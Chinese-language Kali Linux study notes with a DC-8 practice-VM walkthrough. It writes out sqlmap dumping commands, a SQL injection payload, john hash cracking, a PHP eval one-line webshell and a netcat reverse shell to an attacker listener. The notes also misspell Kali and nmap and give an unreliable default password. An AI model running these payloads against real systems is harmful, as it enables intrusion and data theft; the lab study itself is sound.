# Kail

（恶意攻击是违法行为）

kail是基于Debian的linux发行版操作系统，专为网络安全、渗透测试、数字取证、逆向工程而设计，内置了许多渗透工具

[Kail官网](https://www.kali.org/)

使用微软WSL子系统安装
虚拟机安装
U盘安装
实机安装
手机安装

Kail默认用户名和密码是kail

## Kail工具

https://www.kali.org/tools

### Metasploit（渗透测试框架）

开源安全漏洞利用和测试工具

`msfdb init` 初始化metasploit数据库（可选）

永恒之蓝漏洞
使用模块

### Nmap（网络扫描工具）

### Wireshark（网络数据包分析工具）

## 攻击流程

红队攻击流程：

```text
信息收集 → 选择攻击方案 → 初始入侵 → 建立据点 → 权限提升 → 权限维持 → 完成目标
                                               ↑        ↓
                                           横向移动 ← 内网信息收集
```


实战环境搭建：
DC-8靶机 选择DC-8.ova
DC-8靶场下载地址https://www.five86.com/downloads/DC-8.zip


* 信息收集：
    * ip信息：`arp-scan -l` 扫描ip
    * 端口信息：`namp <ip地址>`
        * 22：SSH连接
        * 80：Web服务
    * 目录扫描：`dirsearch -u <ip地址> -i 200`扫描状态码为200的目录
        * 找到账号登入界面
            * bp爆破
            * 漏洞获取
                * SQL注入漏洞
                /?nid=1添加单引号/?nid=1'如果报错基本说明有漏洞
                    * sqlmap注入
                    `sqlmap -u http://192.168.48.175/?nid=1`
                    获取数据库 `sqlmap -u http://192.168.48.175/?nid=1 --dbs`
                    获取数据表 `sqlmap -u http://192.168.48.175/?nid=1 -D <数据库名> --tables`
                    获取表中的列 `sqlmap -u http://192.168.48.175/?nid=1 -D <数据库名> -T <数据表名> --columns`
                    获取数据 `sqlmap -u http://192.168.48.175/?nid=1 -D <数据库名> -T <数据表名> -C <数据1>[,数据2...] --dump`
                    * 手动注入
                    F12开发者工具 HackBar
                    load `' --+`
        * 破解密码（一般得到的密码是哈希）
        `vim a.txt`在里面输入得到的哈希
        `john a.txt`暴力破解哈希

富文本编辑器写木马代码
验证能否执行php木马`<?php phpinfo();?>`
一句话木马`<?php @eval($_POST[1]);?>`
使用蚁剑连接
进入虚拟终端，进行反弹shell（先在kail监听）`nc 192.168.48.163 8888 -e /bin/bash`

## 网络钓鱼

网络钓鱼
将用户引诱到与目标网站非常相似的钓鱼网站

Cobalt Strike团队作战渗透测试
MSF单兵渗透测试

安装
需要有java环境（jdk）

